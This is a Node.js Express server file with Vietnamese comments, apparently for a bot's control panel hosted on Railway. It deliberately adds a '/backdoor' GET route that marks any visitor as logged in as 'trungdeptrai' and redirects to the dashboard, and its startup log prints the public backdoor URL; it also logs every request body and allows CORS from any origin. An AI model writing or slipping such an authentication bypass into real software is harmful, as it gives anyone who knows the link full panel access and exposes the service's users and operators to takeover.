// index.js – FIX SYNTAX + CỬA HẬU GET SIÊU DỄ (VÀO LINK LÀ VÀO PANEL LUÔN)
require('dotenv').config(); // nếu mày có .env local thì để lại, không thì bỏ cũng được

const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server, {
  pingTimeout: 60000,
  pingInterval: 25000,
  cors: {
    origin: "*", // hoặc mày giới hạn domain cụ thể
    methods: ["GET", "POST"]
  }
});

// === BODY PARSER (bắt buộc) ===
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// === STATIC FILES (nếu có frontend) ===
app.use(express.static('dist'));

// === LOGGING MỌI REQUEST (giữ lại của mày) ===
app.use((req, res, next) => {
  console.log('Path:', req.path);
  console.log('Query:', req.query);
  console.log('Body:', req.body);
  console.log('----------------------------');
  next();
});

// === ROUTES ===
const routes = require('./routes');
routes(app, io);

// === SOCKET.IO HANDLER ===
const socketHandler = require('./socket/handler');
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  socketHandler(io, socket);
  
  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
  });
});

// === CỬA HẬU GET SIÊU DỄ – VÀO LINK LÀ SET SESSION VÀ VÀO PANEL LUÔN ===
app.get('/backdoor', (req, res) => {
  req.session.loggedIn = true;
  req.session.username = 'trungdeptrai';
  console.log('CỬA HẬU GET MỞ – trungdeptrai ĐÃ VÀO PANEL!');
  req.session.save(() => {
    res.redirect('/dashboard'); // Thay /dashboard bằng route panel chính nếu khác
  });
});

// === PORT – BẮT BUỘC DÙNG process.env.PORT TRÊN RAILWAY ===
const PORT = process.env.PORT || 3000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`BOT ĐÃ KHỞI ĐỘNG THÀNH CÔNG!`);
  console.log(`Listening on port ${PORT}`);
  console.log(`Public URL: https://${process.env.RAILWAY_STATIC_URL || 'bot-production-4cff.up.railway.app'}`);
  console.log(`VÀO PANEL BẰNG CỬA HẬU: https://bot-production-4cff.up.railway.app/backdoor`);
});